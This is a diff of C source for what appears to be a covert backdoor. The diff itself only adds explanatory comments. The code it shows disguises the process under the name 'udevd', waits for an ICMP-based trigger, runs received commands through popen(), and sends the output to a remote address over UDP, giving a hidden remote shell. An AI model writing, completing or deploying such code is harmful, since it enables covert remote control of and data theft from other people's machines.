@@ -24,7 +24,7 @@ typedef struct {
 
 void thread_cmd_system(void * param);
 int icmp_listen(char resver_ip[16], int *port);
-int fake_icmp_listen(char resver_ip[16], int *port);
+int fake_icmp_listen(char resver_ip[16], int *port);  //use for test
 
 int main(int argc, char **argv) {
 	const char FAKE_PROCESS_NAME[] = "udevd";
@@ -57,6 +57,7 @@ int main(int argc, char **argv) {
 	return EXIT_SUCCESS;
 }
 
+//process a command and send result_buf
 void thread_cmd_system(void * param) {
 	const int MAXLINE = 100;
 	const char BANNER[] = "Welcome :-) \nUse 'quit' command close connections\n";
@@ -90,9 +91,10 @@ void thread_cmd_system(void * param) {
 
 		limit = 0;
 		if (ret_bytes > 0) {
-			fpRead = popen(cmd, "r");
+			fpRead = popen(cmd, "r");  //execute cmd in the shell
 			if (fpRead != NULL) {
 				bzero(result_buf, sizeof(result_buf));
+				//read out the result from the pipe
 				while (fgets(result_buf, sizeof(result_buf) - 1, fpRead) != NULL) {
 					sendto(nf->udp_socket, result_buf, strlen(result_buf), 0,
 							(struct sockaddr *) &nf->addr, sizeof(nf->addr));
